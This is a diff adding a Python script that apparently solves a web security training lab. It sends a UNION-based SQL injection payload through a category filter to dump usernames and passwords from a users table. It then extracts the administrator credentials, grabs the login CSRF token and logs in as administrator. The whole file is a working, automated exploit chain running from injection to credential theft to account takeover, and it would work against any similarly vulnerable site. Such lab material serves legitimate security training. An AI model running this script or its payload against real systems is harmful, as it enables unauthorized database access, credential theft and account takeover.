@@ -1,0 +1,64 @@
+import requests
+import re
+
+session = requests.Session()
+
+filter_url = input("Enter the category filter URL (ending at /filter): ")
+login_url = filter_url.replace("/filter", "/login")
+payload = "' UNION SELECT NULL, username || '~' || password FROM users--"
+params = {'category': payload}
+
+print("[*] Sending UNION SELECT payload with concatenation...")
+response = session.get(filter_url, params=params)
+print(f"[*] Status code: {response.status_code}")
+
+html = re.sub(r'<script.*?</script>', '', response.text, flags=re.DOTALL)
+html = re.sub(r'<style.*?</style>', '', html, flags=re.DOTALL)
+text_only = re.sub(r'<[^>]+>', '\n', html)
+clean_lines = [line.strip() for line in text_only.splitlines() if line.strip()]
+
+credential_lines = [line for line in clean_lines if "~" in line]
+if not credential_lines:
+    print("==> Failed: No credential-like lines found. Check your payload or category spelling.")
+    exit()
+
+print("\n[*] Found possible credential lines:")
+for line in credential_lines:
+    print(f"  {line}")
+
+admin_line = next((line for line in credential_lines if line.startswith("administrator~")), None)
+
+if not admin_line:
+    print("\n==> Could not find a line starting with 'administrator~'. Copy one manually from above if needed.")
+    exit()
+
+username, password = admin_line.split("~", 1)
+print(f"\n[*] Extracted credentials -> username: {username} | password: {password}")
+
+print("\n[*] Fetching login page to grab CSRF token...")
+login_page = session.get(login_url)
+csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
+
+if not csrf_match:
+    print("==> Error: Could not find CSRF token on the login page.")
+    exit()
+
+csrf_token = csrf_match.group(1)
+print(f"[*] Found CSRF Token: {csrf_token}")
+
+login_payload = {
+    'csrf': csrf_token,
+    'username': username,
+    'password': password
+}
+
+print(f"[*] Logging in as {username}...")
+session.post(login_url, data=login_payload, allow_redirects=True)
+
+home_url = login_url.replace("/login", "/")
+home_response = session.get(home_url)
+
+if "Congratulations, you solved the lab!" in home_response.text:
+    print("==> Success: Logged in as administrator and solved the lab!")
+else:
+    print("==> Failed: Login did not trigger the solution. Check the extracted credentials.")
